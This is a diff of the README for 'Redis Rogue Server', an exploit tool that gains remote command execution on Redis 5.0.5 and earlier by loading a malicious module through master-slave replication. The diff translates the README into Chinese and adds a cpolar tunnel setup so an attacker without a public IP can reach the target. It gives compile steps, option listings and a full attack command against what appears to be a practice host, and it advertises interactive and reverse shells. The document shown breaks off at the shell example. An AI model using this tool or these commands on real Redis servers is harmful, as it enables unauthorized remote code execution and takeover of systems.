@@ -1,28 +1,28 @@
 # Redis Rogue Server
 
-A exploit for Redis(<=5.0.5) RCE, inspired by [Redis post-exploitation](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf).
+Redis 4.x 远程命令执行利用工具，适用于 Redis 5.0.5 及以下版本。该工具通过主从复制加载恶意模块实现 RCE，并支持本地端口映射穿透场景。
 
-__Support interactive shell and reverse shell!__
+__支持交互式 shell 和反向 shell，已增加 cpolar 隧道映射配置。__
 
-## Requirements
+## 要求
 
 Python 3.6+
 
-If you want to modify or recompile the redis module, you also require `make`.
+如果需要重新编译 Redis 模块，请安装 `make`。
 
-## Usage
+## 使用方法
 
-Compile exploit:
+编译漏洞模块：
 
-``` bash
+```bash
 cd RedisModulesSDK/exp/
 make
 ```
 
-Copy the .so file to same folder with `redis-rogue-server.py`.
+将生成的 `.so` 文件复制到 `redis-rogue-server.py` 同目录。
 
 ```
-➜ ./redis-rogue-server.py -h
+➜ python redis-rogue-server.py -h
 ______         _ _      ______                         _____                          
 | ___ \       | (_)     | ___ \                       /  ___|                         
 | |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
@@ -36,18 +36,36 @@ ______         _ _      ______                         _____
 Usage: redis-rogue-server.py [options]
 
 Options:
-  -h, --help           show this help message and exit
-  --rhost=REMOTE_HOST  target host
-  --rport=REMOTE_PORT  target redis port, default 6379
-  --lhost=LOCAL_HOST   rogue server ip
-  --lport=LOCAL_PORT   rogue server listen port, default 21000
-  --exp=EXP_FILE       Redis Module to load, default exp.so
-  -v, --verbose        Show full data stream
+  -h, --help             显示帮助信息并退出
+  --rhost=REMOTE_HOST    目标 Redis 主机
+  --rport=REMOTE_PORT    目标 Redis 端口，默认 6379
+  --lhost=SLAVE_HOST     SLAVEOF 使用的地址，可填写公网映射地址
+  --lport=SLAVE_PORT     SLAVEOF 使用的端口，默认 21000
+  --bind-host=BIND_HOST  本地监听地址，默认 0.0.0.0
+  --bind-port=BIND_PORT  本地监听端口，默认 21000
+  --exp=EXP_FILE         要加载的 Redis 模块文件，默认 exp.so
+  -v, --verbose          显示完整的数据流
+  --passwd=PASSWORD      目标 Redis 密码
 ```
 
-## Example
+## cpolar 内网映射示例
 
-### Interactive shell
+如果攻击机在内网没有公网 IP，可以通过 cpolar 将本地 `127.0.0.1:21000` 映射到 `31.tcp.cpolar.top:10222`，然后执行：
+
+```bash
+python redis-rogue-server.py --rhost node.hackhub.get-shell.com --rport 44007 \
+  --lhost 31.tcp.cpolar.top --lport 10222 \
+  --bind-host 127.0.0.1 --bind-port 21000
+```
+
+其中：
+
+- `--lhost` / `--lport` 指定给目标 Redis 的 SLAVEOF 地址
+- `--bind-host` / `--bind-port` 指定本地监听地址，供 cpolar 映射使用
+
+## 示例
+
+### 交互式 shell
 
 ```
 ➜ ./redis-rogue-server.py --rhost 127.0.0.1 --lhost 127.0.0.1
